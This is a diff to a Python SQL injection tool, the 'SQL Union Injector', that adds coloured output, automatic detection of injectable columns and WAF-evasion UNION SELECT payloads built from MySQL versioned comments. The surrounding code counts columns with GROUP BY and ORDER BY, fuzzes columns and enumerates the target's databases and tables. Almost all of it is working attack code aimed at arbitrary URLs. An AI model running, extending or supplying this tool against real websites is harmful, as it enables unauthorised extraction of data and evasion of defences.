@@ -47,21 +47,29 @@ sql_Error = [
 find_more_than_one_vuln_column = False
 
 session_log = "sql-injector.log"
+RED     = '\033[91m'
+BOLD    = '\033[1m'
+GREEN   = '\033[92m'
+YELLOW  = '\033[93m'
+END     = '\033[0m'
 
-banner = """                                      
+banner = RED + BOLD + """
  _____ _____ __       _____     _         
 |   __|     |  |     |  |  |___|_|___ ___ 
 |__   |  |  |  |__   |  |  |   | | . |   |
 |_____|__  _|_____|  |_____|_|_|_|___|_|_|
          |__|                             
+""" + END + YELLOW + """
 ------------------------
 | Union Based Injector |
-------------------------        
+------------------------    
+""" + END + GREEN + """    
                                 | zerouplink |
                                 |┌∩┐(◣_◢)┌∩┐ |
                                 | Hell yeah  |
 
-"""
+""" + END
+
 class website:
 
     def __init__(self):
@@ -102,15 +110,15 @@ class website:
                 self.fingered = self.log.check_log(self.url)
 
                 if self.fingered:
-                    print("[+] URL Detected in the Session Log file")
-                    print("[+] Skipping Discovery Process, jumping to exploitation")
+                    print(YELLOW + "[+] URL Detected in the Session Log file" + END)
+                    print(YELLOW + "[+] Skipping Discovery Process, jumping to exploitation" + END)
                     self.unionUrl = self.log.history
                     self.displayInfo()
                 else:
                     self.testError()
                     self.columnCounterGroupBy()
                     # It'll automatically try Order By method if Group By doesn't work
-                    self.FindVulnColumn()
+                    self.FindVulnColumnAuto()
                     self.displayInfo()
 
             except KeyboardInterrupt:
@@ -144,7 +152,7 @@ class website:
         """
 
     def testError(self):
-        print("[+] Testing webpage for sql errors")
+        print(YELLOW+"[+] Testing webpage for sql errors"+END)
         content = self.getpage(self.url)
         self.vulnerable = False
         self.errorMessage = ""
@@ -158,17 +166,17 @@ class website:
                 break
 
         if not self.vulnerable:
-            print("[!] URL Doesn't seem to be vulnerable to SQLi")
-            print("[!] Try other URL")
+            print(RED+"[!] URL Doesn't seem to be vulnerable to SQLi")
+            print("[!] Try other URL"+END)
             sys.exit(1)
         else:
-            print("[+] SQL Error Message Found")
-            print("[+] [* %s *]" % self.errorMessage)
-
+            print(GREEN+"[+] SQL Error Message Found"+END)
+            print(RED+"[+] [* %s *]" % self.errorMessage)
+            print(END)
 
     def columnCounterOrderBy(self):
         print("[+] Counting Columns")
-        baseUrl = self.url.replace("'","") + " ORDER BY "
+        baseUrl = self.url.strip("'") + " ORDER BY "
 
         msg = "Error: Unknown column"
 
@@ -183,12 +191,13 @@ class website:
                 sys.stdout.flush()
 
             if msg in page:
-                print("\n[+] Column Count = %d" % colno)
+                print(GREEN+"\n[+] Column Count = %d" % colno)
+                print(END)
                 self.columnCount = colno
                 break
         if self.columnCount == 0:
-            print("[!] Cannot find the column count!")
-            print("[!] Target might be blocking Query with WAF")
+            print(RED+"[!] Cannot find the column count!")
+            print("[!] Target might be blocking Query with WAF"+END)
             sys.exit(1)
             
 
@@ -212,7 +221,7 @@ class website:
             Try Group By first, if it didn't work, do the normal way
         """
         print("[+] Counting Columns with 'Group-By' Technique")
-        baseUrl = self.url.replace("'","").replace("=","=-")
+        baseUrl = self.url.replace("=","=-").strip("'")
         baseUrl += "+GROUP+BY+" + ",".join([str(i) for i in range(1,101)])+"--"
         logging.info(baseUrl)
         pattern = re.compile(r"Unknown column '(\d+)' in 'group statement'")
@@ -220,24 +229,25 @@ class website:
         if len(pattern.findall(page)) != 0:
             logging.info(pattern.findall(page))
             column = int(pattern.findall(page)[0]) - 1
-            print("[+] Column count : %d" % column)
+            print(GREEN+"[+] Column count : %d" % column)
+            print(END)
             self.columnCount = column
         else:
             column = 0
-            print("[~] Could not find column with Group By")
-            print("[~] Trying manual method with Order By")
+            print(RED+"[~] Could not find column with Group By")
+            print("[~] Trying manual method with Order By"+END)
             self.columnCounterOrderBy() 
 
 
-    def FindVulnColumn(self):
+    def FindVulnColumnManual(self):
         # Change this if needed to detect the WAF Firewall
         waf_string = "406 Not Acceptable"
 
-        print("[+] Fuzzing Columns to get Injectable Column")
+        print("[+] Fuzzing each columns manually")
         inj_plain_msg = "I <3 MSF"
         inj_hex_msg   = "0x" + inj_plain_msg.encode('hex')
 
-        baseUrl = self.url.replace("=","=-").replace("'","") + "+UNION+ALL+SELECT+"
+        baseUrl = self.url.replace("=","=-").strip("'") + "+UNION+ALL+SELECT+"
         self.columnRange = ",".join([str(i) for i in range(1,self.columnCount+1)])
 
         for colno in range(1,self.columnCount+1):    
@@ -246,26 +256,50 @@ class website:
 
             if waf_string in page:
                 logging.warning("!WAF Detected!")
-                print("[!] Received HTTP Status code 406: Not Acceptable")
+                print(RED+"[!] Received HTTP Status code 406: Not Acceptable")
                 print("[!] WAF Firewall Detected")
-                print("[!] WAF bypass feature will be added in the next release")
+                print("[!] WAF bypass feature will be added in the next release"+END)
                 sys.exit(1)
             else:
                 if inj_plain_msg in page:
                     sys.stdout.write(str(" [" + str(colno) + "]"))
                     self.vulnColumn.append(colno)
-
                     if not find_more_than_one_vuln_column: break
-
                 else:
                     if not self.verbose:
                         sys.stdout.write(str(" " + str(colno)))
                         sys.stdout.flush()
 
-        if self.vulnColumn == 0:
-            print("\n[-] Vulnerable column couldn't be found")
-            print("[-] Please try manually")
+        if len(self.vulnColumn) == 0:
+            print(RED+"\n[-] Vulnerable column couldn't be found")
+            print("[-] Please try manually"+END)
             sys.exit(1)
+        else:
+            print(GREEN+"\n[+] Vulnerable Column Number(s) : %s" % self.vulnColumn)
+            print(END)
+
+    def FindVulnColumnAuto(self):
+        """Union all select 11111,22222,33333,44444,55555--"""
+        print("[+] Fuzzing Columns Automatically to get Injectable Column")
+
+        waf_string = "406 Not Acceptable"
+        baseUrl = self.url.replace("=","=-").strip("'") + "+/*!50000UnIoN*/+/*!50000AlL*/+/*!50000SeLeCt*/+"
+        columnRange = [int(str(i)*5) for i in range(1,self.columnCount+1)]
+        injUrl = baseUrl + ",".join([str(i) for i in columnRange])+"--"      
+        page = self.getpage(injUrl)
+
+        logging.info(injUrl)
+        
+        self.vulnColumn = []
+        for col in columnRange:
+            if str(col) in page:
+                self.vulnColumn.append(columnRange.index(col)+1)
+        logging.info("self.vulnColumn = %s" % self.vulnColumn)
+
+        if len(self.vulnColumn) == 0:
+            print("\n[-] Vulnerable column couldn't be found")
+            print("[-] Trying column by column")
+            self.FindVulnColumnManual()
         else:
             print("\n[+] Vulnerable Column Number(s) : %s" % self.vulnColumn)
 
@@ -282,7 +316,7 @@ class website:
                     # Mark injection point with '!'
                 else: colnumbers.append(i)
 
-            self.unionUrl = self.url.strip("'").replace("=","=-") + "+UNION+ALL+SELECT+"
+            self.unionUrl = self.url.strip("'").replace("=","=-") + "+/*!50000UnIoN*/+/*!50000AlL*/+/*!50000SeLeCt*/+"
             self.unionUrl += ",".join([str(i) for i in colnumbers])
 
             self.log.write_log(self.unionUrl)
@@ -307,7 +341,6 @@ class website:
 
             self.databases = self.parse(self.getpage(databaseUrl))[0]
             print("[+] Databases : %s" % self.databases)
-
 
             self.tables = [str(i).strip(".:.") for i in self.parse(self.getpage(tableUrl))[0].split(",")]
             print("[+] Tables    : %s" % "\n\t\t".join([str(i) for i in self.tables]))
@@ -370,11 +403,11 @@ class website:
         try:
             return urllib.urlopen(url).read()
         except IOError:
-            print("[!] Network Error Occured")
+            print(RED+"[!] Network Error Occured"+END)
             sys.exit(1)
         except Exception as e:
             logging.warning(e)
-            print("[!] Error Occured")
+            print(RED+"[!] Error Occured"+END)
             print(e)
             sys.exit(1)
 
